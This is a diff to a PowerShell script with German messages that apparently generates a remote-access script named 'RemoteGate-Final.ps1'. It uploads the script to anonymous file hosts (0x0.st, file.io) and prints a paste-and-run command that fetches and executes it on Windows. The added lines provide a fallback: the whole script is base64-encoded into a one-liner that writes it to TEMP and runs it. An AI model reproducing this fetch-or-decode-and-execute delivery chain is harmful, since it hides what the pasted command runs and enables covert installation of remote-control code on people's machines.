@@ -27,7 +27,14 @@ $config | ConvertTo-Json | Set-Content -Path (Join-Path $RepoRoot "control-panel
 $uploadUrl=""
 try{ $uploadUrl=(curl -F "file=@$DefaultOutput" https://0x0.st 2>$null | Select-String "https://0x0.st" | Out-String).Trim() }catch{}
 if(-not $uploadUrl){ try{ $j=curl -F "file=@$DefaultOutput" https://file.io 2>$null | ConvertFrom-Json; $uploadUrl=$j.link }catch{} }
-if(-not $uploadUrl){ Write-Host "Upload fehlgeschlagen — prüfe Internet, dann nochmal gen.command starten"; exit 1 }
+if(-not $uploadUrl){
+  $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($DefaultOutput))
+  Write-Host "Kein Upload — nutze Offline-Befehl (funktioniert genauso):"
+  Write-Host "══════════════════════════════════════"
+  Write-Host "powershell -Command ""`$b=[Convert]::FromBase64String('$b64'); [IO.File]::WriteAllBytes(""`$env:TEMP\RemoteGate-Final.ps1"",`$b); & `$env:TEMP\RemoteGate-Final.ps1"""
+  Write-Host "══════════════════════════════════════"
+  exit 0
+}
 Write-Host "══════════════════════════════════════"
 Write-Host "DEIN WINDOWS-BEFEHL:"
 Write-Host "powershell -Command ""iwr $uploadUrl -OutFile `$env:TEMP\RemoteGate-Final.ps1; & `$env:TEMP\RemoteGate-Final.ps1"""
